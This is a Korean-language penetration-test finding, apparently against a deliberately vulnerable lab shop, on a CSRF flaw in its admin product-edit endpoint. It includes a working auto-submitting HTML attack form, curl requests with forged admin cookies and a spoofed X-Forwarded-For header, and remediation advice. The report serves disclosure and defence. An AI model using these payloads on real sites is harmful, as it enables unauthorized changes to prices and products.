# 취약점 보고서: VULN-005

## 취약점 요약
- **취약점 유형**: 사이트 간 요청 위조 (Cross-Site Request Forgery, CSRF)
- **위치**: 관리자 페이지 - 제품 관리 (`/admin/products`)
- **위험도**: 높음 (High)

## 취약점 설명
VULN-SHOP의 제품 관리 페이지(`/admin/products`)에 있는 '제품 정보 수정' 기능은 CSRF 공격에 취약합니다. 상태를 변경하는(state-changing) `POST` 요청을 처리함에도 불구하고, Anti-CSRF 토큰과 같은 위조 방지 메커니즘을 사용하지 않습니다.

이로 인해 공격자는 로그인된 관리자의 세션을 이용하여 제품 정보를 무단으로 수정하는 악성 요청을 위조할 수 있습니다. 예를 들어, 공격자는 자신이 제어하는 웹사이트에 특정 제품의 가격을 0으로 변경하거나, 이름을 악의적인 문구로 변경하는 자동 제출 폼을 숨겨둘 수 있습니다. VULN-SHOP에 관리자로 로그인한 사용자가 이 웹사이트를 방문하면, 자신도 모르는 사이에 제품 정보가 변경됩니다.

## 재현 단계
1. `VULN-003` (접근 제어 손상) 취약점을 이용하여 관리자 권한을 획득합니다.
2. (시뮬레이션) 공격자가 제어하는 악성 웹페이지에 아래와 같은 코드를 삽입합니다. 이 코드는 ID가 2인 제품의 가격을 0.01로, 이름을 "HACKED"로 변경하는 요청을 자동으로 보냅니다.
   ```html
   <!-- http://attacker-site.com/malicious.html -->
   <html>
     <body>
       <p>Loading...</p>
       <form id="csrf-form" action="http://192.168.0.28:3000/admin/products/2" method="POST">
         <input type="hidden" name="name" value="HACKED" />
         <input type="hidden" name="price" value="0.01" />
         <input type="hidden" name="description" value="This product has been hacked." />
       </form>
       <script>
         document.getElementById('csrf-form').submit();
       </script>
     </body>
   </html>
   ```
3. 관리자 권한으로 VULN-SHOP에 로그인된 사용자가 이 악성 페이지를 방문합니다.
4. 사용자의 의도와 상관없이 제품 정보가 변경됩니다.

**검증용 `curl` 명령어:**
- **제품 정보 변경 (공격):**
  ```bash
  # 관리자 쿠키를 사용하여 ID 2번 제품의 이름을 "HACKED"로 변경
  curl -X POST --cookie "user=admin; isAdmin=true; user_id=1" -H "X-Forwarded-For: 10.0.0.103" --data "name=HACKED&price=0.01&description=This+product+has+been+hacked." "http://192.168.0.28:3000/admin/products/2"
  ```
- **변경 확인:**
  ```bash
  # 관리자 페이지를 다시 확인하여 이름이 변경되었는지 확인
  curl -s --cookie "user=admin; isAdmin=true; user_id=1" -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/admin/products" | grep "HACKED"
  ```

## 잠재적 영향
- **데이터 무결성 훼손**: 공격자는 모든 제품의 이름, 가격, 설명 등 중요 정보를 임의로 변조하여 쇼핑몰 운영을 방해하고 고객에게 혼란을 줄 수 있습니다.
- **금전적 손실**: 모든 제품의 가격을 0원 또는 매우 낮은 가격으로 변경하여 회사에 직접적인 금전적 손실을 입힐 수 있습니다.
- **서비스 신뢰도 저하**: 제품 정보가 악의적으로 변경되어 표시될 경우, 쇼핑몰의 신뢰도가 심각하게 훼손됩니다.

## 권고 사항
- **CSRF 토큰 적용**: 사용자 계정 삭제 기능과 마찬가지로, 제품 정보 수정과 같이 데이터 상태를 변경하는 모든 `POST` 요청에 대해 Anti-CSRF 토큰을 적용해야 합니다. 서버는 폼을 렌더링할 때 예측 불가능한 고유 토큰을 생성하여 폼에 포함시키고, 요청 처리 시 해당 토큰의 유효성을 반드시 검증해야 합니다.
- **SameSite 쿠키 속성 사용**: 세션 쿠키에 `SameSite=Strict` 또는 `SameSite=Lax` 속성을 설정하여, 외부 사이트에서 시작된 요청에는 쿠키가 전송되지 않도록 제한함으로써 CSRF 공격의 위험을 완화할 수 있습니다.
